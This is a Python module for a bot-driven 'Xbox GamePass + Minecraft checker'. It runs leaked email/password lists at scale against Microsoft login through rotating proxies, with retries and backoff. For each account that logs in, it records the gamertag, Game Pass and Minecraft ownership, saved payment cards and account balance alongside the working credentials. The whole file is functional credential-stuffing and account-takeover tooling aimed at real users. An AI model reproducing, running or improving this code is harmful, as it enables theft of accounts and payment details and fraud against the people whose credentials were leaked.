"""Xbox GamePass + Minecraft checker."""
import concurrent.futures
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import config
from config import log
from hotmail import (
    ms_login, xbox_auth, xsts_auth, fetch_profile, fetch_games,
    fetch_minecraft, fetch_cards, new_session, get_pooled_session,
    return_session, MAX_ATTEMPTS,
)

# Permanent XSTS errors that make retrying pointless
_XSTS_PERMANENT = frozenset(
    ("no_xbox_account", "banned", "child_account", "adult_verification"))


def check_xbox(job, email, pw):
    prev_proxy = None
    for attempt in range(MAX_ATTEMPTS):
        if job.cancelled:
            return
        if attempt > 0:
            with job.lock: job.retried += 1
        s = get_pooled_session(attempt=attempt, prev_proxy=prev_proxy)
        prev_proxy = getattr(s, "_proxy_url", None)
        try:
            tok, st = ms_login(s, email, pw)
            if st == "bad":
                with job.lock: job.bad += 1
                return
            if st == "2fa":
                with job.lock: job.twofa += 1
                return
            # B-01: unclear was falling through to net — now tracked correctly
            if st == "unclear":
                with job.lock: job.unclear += 1
                return
            if st != "success":
                if attempt < MAX_ATTEMPTS - 1:
                    time.sleep(0.5 * (2 ** attempt))
                continue

            xb, uhs, xb_st = xbox_auth(s, tok)
            if not xb:
                if xb_st == "no_xbox":
                    with job.lock: job.skip += 1
                    return
                continue

            # B-09: permanent XSTS errors shouldn't burn 3 retries
            xsts_tok, xsts_st = xsts_auth(s, xb)
            if not xsts_tok:
                if xsts_st in _XSTS_PERMANENT:
                    with job.lock: job.skip += 1
                    return
                continue

            xuid, tag, gs = fetch_profile(s, uhs, xsts_tok)
            if xuid == "retry":
                xuid = None

            mc, gp = fetch_minecraft(s, xb, uhs)
            cards_str, balance = fetch_cards(s)
            games = fetch_games(s, uhs, xsts_tok, xuid) if xuid else []

            if config.DEBUG_XBOX:
                log("xbox-dbg",
                    f"check_xbox {email} tag={tag} gs={gs} mc={mc} gp={gp} "
                    f"cards={cards_str} xuid={xuid}",
                    "DEBUG")

            is_hit = (tag or mc == "YES" or gp != "NO"
                      or cards_str != "NO CC" or gs > 0)
            if not is_hit:
                with job.lock: job.skip += 1
                return

            with job.lock:
                job.valid += 1
                if attempt > 0: job.recovered += 1
                if gp != "NO":            job.gamepass   += 1
                if mc == "YES":           job.minecraft  += 1
                if cards_str != "NO CC":  job.with_cards += 1
                # L-06: fetch_cards never returns "$0.0"/"$0.00" (only >0 values)
                if balance != "N/A":
                    job.with_balance += 1
                job.valid_list.append((email, pw, {
                    "gamertag":  tag or "",
                    "gscore":    gs,
                    "gamepass":  gp,
                    "minecraft": mc,
                    "cards":     cards_str,
                    "balance":   balance,
                    "games":     games,
                    "country":   getattr(s, "_billing_country", "") or config.resolve_country_code(email),
                }))
            return
        finally:
            try: return_session(s)
            except: pass
    with job.lock: job.net += 1


def check_minecraft(job, email, pw):
    prev_proxy = None
    for attempt in range(MAX_ATTEMPTS):
        if job.cancelled:
            return
        if attempt > 0:
            with job.lock: job.retried += 1
        s = get_pooled_session(attempt=attempt, prev_proxy=prev_proxy)
        prev_proxy = getattr(s, "_proxy_url", None)
        try:
            tok, st = ms_login(s, email, pw)
            if st == "bad":
                with job.lock: job.bad += 1
                return
            if st == "2fa":
                with job.lock: job.twofa += 1
                return
            # B-01
            if st == "unclear":
                with job.lock: job.unclear += 1
                return
            if st != "success":
                if attempt < MAX_ATTEMPTS - 1:
                    time.sleep(0.5 * (2 ** attempt))
                continue

            xb, uhs, xb_st = xbox_auth(s, tok)
            if not xb:
                if xb_st == "no_xbox":
                    with job.lock: job.skip += 1
                    return
                continue

            # B-09
            xsts_tok, xsts_st = xsts_auth(s, xb)
            if not xsts_tok:
                if xsts_st in _XSTS_PERMANENT:
                    with job.lock: job.skip += 1
                    return
                continue

            xuid, tag, gs = fetch_profile(s, uhs, xsts_tok)
            if xuid == "retry":
                xuid = None

            mc, gp = fetch_minecraft(s, xb, uhs)
            if config.DEBUG_XBOX:
                log("xbox-dbg",
                    f"check_minecraft {email} mc={mc} gp={gp} tag={tag} gs={gs}",
                    "DEBUG")
            if mc != "YES":
                with job.lock: job.skip += 1
                return

            with job.lock:
                job.valid     += 1
                if attempt > 0: job.recovered += 1
                job.minecraft += 1
                job.valid_list.append((email, pw, {
                    "gamertag":  tag or "",
                    "gscore":    gs,
                    "gamepass":  gp,
                    "minecraft": mc,
                    "cards":     "NO CC",
                    "balance":   "N/A",
                    "games":     [],
                    "country":   config.resolve_country_code(email),
                }))
            return
        finally:
            try: return_session(s)
            except: pass
    with job.lock: job.net += 1


def _safe_check(fn, job, email, pw):
    try:
        fn(job, email, pw)
    except Exception as e:
        log("xbox", f"{type(e).__name__}: {e}", "ERROR")
        with job.lock:
            job.net += 1
    finally:
        with job.lock:
            job.done_keys.add((email.lower(), pw))



def run(job, reporter):
    fn = {"xbox": check_xbox, "minecraft": check_minecraft}.get(job.mode)
    if fn is None:
        log("xbox", f"unknown mode {job.mode}", "ERROR")
        return

    log("xbox", f"start chat={job.chat_id} mode={job.mode} "
                f"combos={len(job.combos)} workers={config.XBOX_THREADS}", "INFO")

    done_evt = threading.Event()

    def _progress_watcher():
        while not done_evt.is_set():
            try:
                reporter()
            except Exception as e:
                log("xbox", f"reporter: {e}", "WARN")
            done_evt.wait(3)

    watcher = threading.Thread(target=_progress_watcher, daemon=True)
    watcher.start()

    # Chunked submission: keep at most WORKERS*2 futures alive at once.
    # Avoids loading 500k future objects into RAM for large combo lists.
    try:
        with ThreadPoolExecutor(max_workers=config.XBOX_THREADS) as ex:
            pending = set()
            for combo in job.combos:
                if job.cancelled:
                    break
                # Drain completed futures before adding more
                while len(pending) >= config.XBOX_THREADS * 2:
                    done, pending = concurrent.futures.wait(
                        pending,
                        return_when=concurrent.futures.FIRST_COMPLETED)
                    for f in done:
                        with job.lock:
                            job.processed += 1
                    if job.cancelled:
                        break
                if job.cancelled:
                    break
                e, p = combo[0], combo[1]
                pending.add(ex.submit(_safe_check, fn, job, e, p))
            # drain remainder
            for f in as_completed(pending):
                with job.lock:
                    job.processed += 1
                if job.cancelled:
                    for fx in pending:
                        fx.cancel()
                    break
    finally:
        done_evt.set()
        try: reporter(force=True)
        except: pass

    log("xbox", f"done chat={job.chat_id} valid={job.valid} bad={job.bad} "
                f"2fa={job.twofa} net={job.net} skip={job.skip} unclear={job.unclear} "
                f"gp={job.gamepass} mc={job.minecraft}", "DONE")
